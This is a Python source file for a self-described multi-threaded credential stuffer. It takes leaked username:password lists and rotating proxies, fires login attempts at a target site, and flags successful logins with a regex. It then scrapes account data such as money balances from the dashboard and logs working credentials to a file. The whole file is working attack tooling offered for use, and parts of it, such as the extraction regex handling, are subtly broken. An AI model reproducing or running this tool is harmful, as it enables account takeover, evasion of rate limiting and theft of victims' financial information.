import json
import requests
import re
import threading
import os
import random
import argparse

#Example JSON - You can create your own profiles in the profiles folder. profiles/example.json
#You will need proxies.txt, and credentials.txt in the same directory.
#{
#    "url": "https://www.example.com/login",
#    "success_grep": "Welcome",
#    "extractgroup1_grep":"(?<=\\$)\\d+", #This gets the number after $ so you can see how money is on the account.
#    "url_for_extract":"https://www.example.com/dashboard"
#}

print("""
.___________. __    __   _______      ______   .______          ___       ______  __       _______ 
|           ||  |  |  | |   ____|    /  __  \  |   _  \        /   \     /      ||  |     |   ____|
`---|  |----`|  |__|  | |  |__      |  |  |  | |  |_)  |      /  ^  \   |  ,----'|  |     |  |__   
    |  |     |   __   | |   __|     |  |  |  | |      /      /  /_\  \  |  |     |  |     |   __|  
    |  |     |  |  |  | |  |____    |  `--'  | |  |\  \----./  _____  \ |  `----.|  `----.|  |____ 
    |__|     |__|  |__| |_______|    \______/  | _| `._____/__/     \__\ \______||_______||_______|
""")
print("Oracle's Credential Stuffer")
print("A Multi-threaded Credential Stuffer built-in with readable profiles and proxies, along with an easy way to check for successful logins, and then grep for the data you want to extract.")
print("Have a feature request? Post an issue and I may add it.")
print("Usage: python main.py example #####Set Thread Count Below if you want it changed. Proxy can be turned to false if you don't want to use one.")
num_threads = 50

parser = argparse.ArgumentParser()
parser.add_argument("profile", help="Name of the profile to use")
parser.add_argument('--proxy', default=True, action='store_true')
args = parser.parse_args()

with open(f"profiles/{args.profile}.json", "r") as f:
    profile_data = json.load(f)

# Function to make the login request
def login_request(url, data, proxy, success_grep, url_for_extract):
    try:
        session = requests.Session()
        #Add a for loop here if you want to add common passwords.
        response = session.post(url, data=data, proxies=proxy)
        if response.status_code == 200:
            match = re.search(success_grep, response.text)
            if match:
                print("[+] Successful Login! " + data['username'] + ":" + data['password'])
                response2 = session.get(url_for_extract, proxies=proxy)
                match2 = re.search(data["extractgroup1_grep"], response2.text)
                if match2:
                    value = match2.group(1)
                    with open("success_log.txt", "a") as log_file:
                        log_file.write(f"username: {data['username']}, password: {data['password']}, value: {value}\n")
                    #print(f"Value {value} found and logged.")
                else:
                    print("extractgroup1_grep not found.")
#            else:
#                print("Welcome message not found.")
        else:
            print("Request failed with status code:", response.status_code)
    except requests.exceptions.RequestException as e:
        print("Error:", e)

# Function to handle the different profiles
def handle_profile(data):
    #print("Testing handle_profile - data" + str(data))
    username = data[0]
    password = data[1]
    # Open the JSON file
    proxy = random.choice(proxies)
    profile = args.profile
    with open(f"profiles/{profile}.json") as json_file:
        profile_data = json.load(json_file)
    # Make the login request
    login_request(profile_data["url"], {"username": username, "password": password, "extractgroup1_grep": ""}, proxy,
                  profile_data["success_grep"], profile_data["url_for_extract"])

# Read the usernames and passwords from the .txt file
with open("credentials.txt", "r", encoding='utf-8', errors='ignore') as f:
    credentials = f.readlines()

credentials = [credential.strip().split(":") for credential in credentials]


with open("proxies.txt") as f:
    if not args.proxy == False:
        proxies = f.readlines()
        proxies = [proxy.strip() for proxy in proxies]
        proxies = [{"http": f"https://{proxy}"} for proxy in proxies]
    else:
        proxies = None

#If you just use 1 proxy because your megaproxy automatically gives you an IP or URL, then you can just get rid of this and define it as a variable.
#Otherwise it will work as is.

for i in range(0, len(credentials), num_threads):
    for j in range(num_threads):
        if i + j < len(credentials):
            data = credentials[i + j]
            #print("For loop in threads" + str(data))
            thread = threading.Thread(target=handle_profile, args=(data,))
            thread.start()
